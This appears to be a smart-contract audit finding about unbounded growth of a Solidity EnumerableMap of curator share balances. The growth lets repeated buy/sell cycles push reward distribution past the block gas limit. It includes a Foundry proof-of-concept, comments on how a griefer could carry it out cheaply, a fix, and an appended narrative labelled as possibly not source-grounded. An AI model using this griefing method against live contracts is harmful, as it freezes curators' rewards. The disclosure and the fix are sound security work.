---
id: 21851
severity: "High"
---

# `shareBalance` bloating eventually blocks curator rewards distribution

## Description

Cred curator share balances are tracked by the following data structure in the `Cred`:

```solidity
mapping(uint256 credId => EnumerableMap.AddressToUintMap balance) private shareBalance;
```

There may be `MAX_SUPPLY = 999` maximum curators of a cred. However, when a curator sells all their shares, the curator entry still remains in the data structure with a zero shares number. Because of that the mapping grows unlimited. As soon as about 4000 different addresses owned (for any time period) a cred’s share, the current shareholders, regardless of their current number, will be no longer enumerable by `CuratorRewardsDistributor`. Rewards distribution for this cred will be blocked because gas usage hits the block gas limit.

Have a look at the curator share balance update code:

```solidity
function _updateCuratorShareBalance(uint256 credId_, address sender_, uint256 amount_, bool isBuy) internal {
    (, uint256 currentNum) = shareBalance[credId_].tryGet(sender_);

    if (isBuy) {
        if (currentNum == 0 && !_credIdExistsPerAddress[sender_][credId_]) {
            _addCredIdPerAddress(credId_, sender_);
            _credIdExistsPerAddress[sender_][credId_] = true;
        }
        shareBalance[credId_].set(sender_, currentNum + amount_);
    } else {
        if ((currentNum - amount_) == 0) {
            _removeCredIdPerAddress(credId_, sender_);
            _credIdExistsPerAddress[sender_][credId_] = false;
        }
        shareBalance[credId_].set(sender_, currentNum - amount_);
    }
}
```

When all shares are sold by the curator, its balance is set to `0` rather than deleted from the `EnumerableMap`.

During rewards distribution, a call to `getCuratorAddresses` is made. The control goes to `_getCuratorData` function which enumerates all entries of `shareBalance[credId]`:

```solidity
uint256 stopIndex;
if (stop_ == 0 || stop_ > shareBalance[credId_].length()) {
    stopIndex = shareBalance[credId_].length();
} else {
    stopIndex = stop_;
}

// ...
for (uint256 i = start_; i < stopIndex; ++i) {
    (address key, uint256 shareAmount) = shareBalance[credId_].at(i);
```

Reading storage slots is quite an expensive operation nowadays. The execution will eventually hit the block gas limit and the transaction will be reverted. Details of `sload` costs and block gas limit may vary from chain to chain, but the DoS possibility never goes away.

Besides, take into account that storage access costs may increase significantly, rendering the discussed code unexecutable. Such a change may be introduced in a hardfork, e.g., the cost of the `sload` opcode was increased 10 times recently.

## Proof of Concept

Please insert this test into `test/CuratorRewardsDistributor.t.sol` and run with `forge test --match-test testBloatingBalances -vv --gas-limit 2000000000 --block-gas-limit 2000000000 --isolate`.

Please note:

  * The PoC illustrates gas usage over 30Mgas (the current Ethereum block gas limit). Details of `sload` costs and block gas limit may vary from chain to chain.
  * Higher gas limit options are needed for the initial setup of the test.
  * `--isolate` option is needed to “disable” slot re-read discounts which manifest themselves since `shareBalance` slots are actively read during the setup phase.

```solidity
function testBloatingBalances() public {
    uint256 credId = 1;
    uint256 depositAmount = 1 ether;

    // Deposit some ETH to the curatorRewardsDistributor
    curatorRewardsDistributor.deposit{ value: depositAmount }(credId, depositAmount);

    // A similar piece of code may be executed by a griefer to block rewards distribution.
    // However, instead of `vm.startPrank` he'll have to resort to lightweight proxy contracts or EIP-7702.
    // `SHARE_LOCK_PERIOD` won't be a problem since several accounts can trade shares in parallel.
    // If the cred is not far into the bonding curve, the griefing can be done cheaply.
    for (uint i = 0; i < 4000; i++) {
        address trader = address(uint160(i + 1000));
        vm.deal(trader, 0.1 ether);
        vm.startPrank(trader);
        cred.buyShareCred{value: 0.1 ether}(credId, 1, 0);
        vm.warp(block.timestamp + 10 minutes + 1 seconds);
        cred.sellShareCred(credId, 1, 0);
        vm.stopPrank();
    }

    uint gas = gasleft();
    vm.prank(user2);
    curatorRewardsDistributor.distribute(credId);
    uint gasSpend = gas - gasleft();

    console2.log("`distribute()` gas: ", gasSpend);
}
```

## Recommendation

Remove zero entries from the map:

```solidity
function _updateCuratorShareBalance(uint256 credId_, address sender_, uint256 amount_, bool isBuy) internal {
    (, uint256 currentNum) = shareBalance[credId_].tryGet(sender_);

    if (isBuy) {
        if (currentNum == 0 && !_credIdExistsPerAddress[sender_][credId_]) {
            _addCredIdPerAddress(credId_, sender_);
            _credIdExistsPerAddress[sender_][credId_] = true;
        }
        shareBalance[credId_].set(sender_, currentNum + amount_);
    } else {
        if ((currentNum - amount_) == 0) {
            _removeCredIdPerAddress(credId_, sender_);
            _credIdExistsPerAddress[sender_][credId_] = false;
            shareBalance[credId_].remove(sender_);
        } else
            shareBalance[credId_].set(sender_, currentNum - amount_);
    }
}
```

## Derived Narrative

The following field is derived content and may not be source-grounded:

The vulnerability is that the contract keeps a mapping from credId to an enumerable map of curator addresses to share balances. When a curator sells all their shares, the entry is left with a zero balance instead of being removed. Because the enumerable map does not prune zero entries, the map size can grow without bound as different addresses trade shares over time. The rewards distribution function iterates over the entire map using .at(i) for each index, which requires an SLOAD for every entry. As the number of stale zero‑balance entries approaches a few thousand, the gas required to enumerate the map exceeds the block gas limit, causing the distribute transaction to run out of gas and revert. Consequently, curators that are still holding shares never receive their rewards, and the protocol becomes effectively frozen for that cred. The issue appears after many buy‑sell cycles, even though the maximum number of active curators is limited to 999; the stale entries are not counted as active but still occupy storage and enumeration slots. The problem was discovered during a manual audit that simulated 4000 distinct traders buying and immediately selling a single share, observing gas consumption above 30 million. The bug is hard to notice because the contract appears to work correctly for normal numbers of curators, and zero balances are not visible in the UI, giving a false impression that the state is clean. The vulnerability belongs to the class of unbounded enumeration or storage‑bloat DoS bugs, where stale entries prevent a function from completing within gas limits. The fix is to delete the entry from the enumerable map when a curator’s balance reaches zero, ensuring that only active curators are enumerated and that the map size stays bounded. From a user perspective, a curator expects to receive a reward after a distribution call, but instead the transaction fails with an out‑of‑gas error, leaving the reward unclaimed and potentially causing loss of expected income. The protocol’s reward distribution mechanism is therefore unsafe under adversarial usage where an attacker can create many temporary accounts to inflate the map size.
